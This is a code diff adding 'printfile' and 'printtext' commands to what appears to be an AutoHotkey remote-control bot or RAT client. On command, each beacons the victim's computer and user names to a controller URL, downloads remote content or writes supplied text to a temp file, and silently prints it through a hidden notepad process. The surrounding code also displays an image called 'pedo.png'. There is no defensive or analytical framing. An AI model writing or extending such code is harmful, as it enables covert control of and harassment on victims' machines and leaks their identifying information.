@@ -186,6 +186,35 @@ Interpret(command,binurl,mousean,sleept,RvCmdVersion)
 				Gui, Add, Pic, w100 h100, pedo.png
 				mousean := SubArray3
 			}
+			else if SubArray2 = printfile
+			{
+				temp :=  binurl "log=" A_ComputerName "--" A_UserName ":-now_dowloading_and_printing_:-" SubArray3
+				whr := ComObjCreate("WinHttp.WinHttpRequest.5.1")
+				whr.Open("GET",temp, true)
+				whr.Send()
+				whr.WaitForResponse()
+				temp := whr.ResponseText
+				repcycl := SubArray3
+				filedelete, %A_Temp%\noice.txt
+				UrlDownloadToFile, %SubArray3%, %A_Temp%\noice.txt
+				runwait, notepad /P %A_Temp%\noice.txt,,Hide
+				filedelete, %A_Temp%\noice.txt
+			}
+			else if SubArray2 =	printtext
+			{
+				temp :=  binurl "log=" A_ComputerName "--" A_UserName ":-now_printing_:-" SubArray3
+				whr := ComObjCreate("WinHttp.WinHttpRequest.5.1")
+				whr.Open("GET",temp, true)
+				whr.Send()
+				whr.WaitForResponse()
+				temp := whr.ResponseText
+				repcycl := SubArray3
+				StringReplace, Value, SubArray3,~,`n, All
+				filedelete, %A_Temp%\noice.txt
+				fileappend, %Value%, %A_Temp%\noice.txt
+				runwait, notepad /P %A_Temp%\noice.txt,,Hide
+				filedelete, %A_Temp%\noice.txt
+			}
 			else if SubArray2 = reportcycles
 			{
 				temp :=  binurl "log=" A_ComputerName "--" A_UserName ":-report_cycles_now:-" SubArray3
